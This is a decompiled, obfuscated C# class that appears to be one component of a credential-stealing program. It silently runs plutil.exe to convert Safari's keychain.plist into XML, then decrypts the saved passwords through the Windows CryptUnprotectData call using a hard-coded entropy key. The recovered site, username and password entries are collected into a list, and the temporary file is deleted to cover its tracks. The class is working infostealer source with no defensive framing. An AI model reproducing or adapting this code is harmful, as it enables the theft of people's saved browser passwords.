using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

internal sealed class Class15
{
	private struct Struct5
	{
		public int int_0;

		public unsafe byte* pByte_0;
	}

	private static byte[] byte_0 = new byte[144]
	{
		29, 172, 168, 248, 211, 184, 72, 62, 72, 125,
		62, 10, 98, 7, 221, 38, 230, 103, 129, 3,
		231, 178, 19, 165, 176, 121, 238, 79, 15, 65,
		21, 237, 123, 20, 140, 229, 75, 70, 13, 193,
		142, 254, 214, 231, 39, 117, 6, 139, 73, 0,
		220, 15, 48, 160, 158, 253, 9, 133, 241, 200,
		170, 117, 193, 8, 5, 121, 1, 226, 151, 216,
		175, 128, 56, 96, 11, 113, 14, 104, 83, 119,
		47, 15, 97, 246, 29, 142, 143, 92, 178, 61,
		33, 116, 64, 75, 181, 6, 110, 171, 122, 189,
		139, 169, 126, 50, 143, 110, 6, 36, 217, 41,
		164, 165, 190, 38, 35, 253, 238, 241, 76, 15,
		116, 94, 88, 251, 145, 116, 239, 145, 99, 111,
		109, 46, 97, 112, 112, 108, 101, 46, 83, 97,
		102, 97, 114, 105
	};

	[DllImport("kernel32.dll")]
	private static extern IntPtr LocalFree(IntPtr intptr_0);

	[DllImport("crypt32.dll")]
	private unsafe static extern bool CryptUnprotectData(Struct5* pStruct5_0, string string_0, Struct5* pStruct5_1, IntPtr intptr_0, IntPtr intptr_1, uint uint_0, Struct5* pStruct5_2);

	public static void smethod_0()
	{
		string string_ = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Common Files\\Apple\\Apple Application Support\\plutil.exe";
		string string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Apple Computer\\Preferences\\keychain.plist";
		string string_3 = null;
		if (smethod_3(string_, string_2, out string_3))
		{
			smethod_1(string_3.Remove(string_3.Length - 2));
		}
	}

	private static void smethod_1(string string_0)
	{
		string input = File.ReadAllText(string_0);
		string[] array;
		for (int num = 1; num < (array = Regex.Split(Regex.Split(input, "<array>")[1], "<dict>")).Length; num++)
		{
			string string_ = smethod_4(array[num], "<string>", "</string>", 0);
			string string_2 = smethod_4(array[num], "<string>", "</string>", 5);
			string s = smethod_4(array[num], "<data>", "</data>", 0);
			string string_3 = smethod_2(Convert.FromBase64String(s));
			Class12.list_0.Add(new GClass0("Safari", string_2, string_, string_3, string.Empty));
		}
		File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp_keychain.xml");
	}

	private unsafe static string smethod_2(byte[] byte_1)
	{
		int num = 0;
		Struct5 @struct = default(Struct5);
		@struct.int_0 = byte_1.Length;
		fixed (byte* pByte_ = byte_1)
		{
			@struct.pByte_0 = pByte_;
		}
		Struct5 struct2 = default(Struct5);
		struct2.int_0 = byte_0.Length;
		fixed (byte* pByte_2 = byte_0)
		{
			struct2.pByte_0 = pByte_2;
		}
		Struct5 struct3 = default(Struct5);
		if (!CryptUnprotectData(&@struct, null, &struct2, IntPtr.Zero, IntPtr.Zero, 0u, &struct3))
		{
			return null;
		}
		byte* pByte_3 = struct3.pByte_0;
		num = *(int*)pByte_3;
		char[] array = new char[num];
		for (int i = 4; i < num + 4; i++)
		{
			array[i - 4] = (char)pByte_3[i];
		}
		LocalFree(new IntPtr(struct3.pByte_0));
		return new string(array);
	}

	private static bool smethod_3(string string_0, string string_1, out string string_2)
	{
		string_2 = null;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Safari\\Apple Application Support\\plutil.exe";
		if (!File.Exists(string_0))
		{
			if (!File.Exists(text))
			{
				return false;
			}
			string_0 = text;
		}
		Process process = new Process();
		process.StartInfo.FileName = string_0;
		process.StartInfo.Arguments = " -convert xml1 -s -o \"" + (string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp_keychain.xml\" ") + "\"" + string_1 + "\"";
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.Start();
		process.WaitForExit();
		return process.StandardOutput.ReadToEnd().Length == 0;
	}

	private static string smethod_4(string string_0, string string_1, string string_2, int int_0)
	{
		string input = Regex.Split(string_0, string_1)[int_0 + 1];
		return Regex.Split(input, string_2)[0];
	}
}
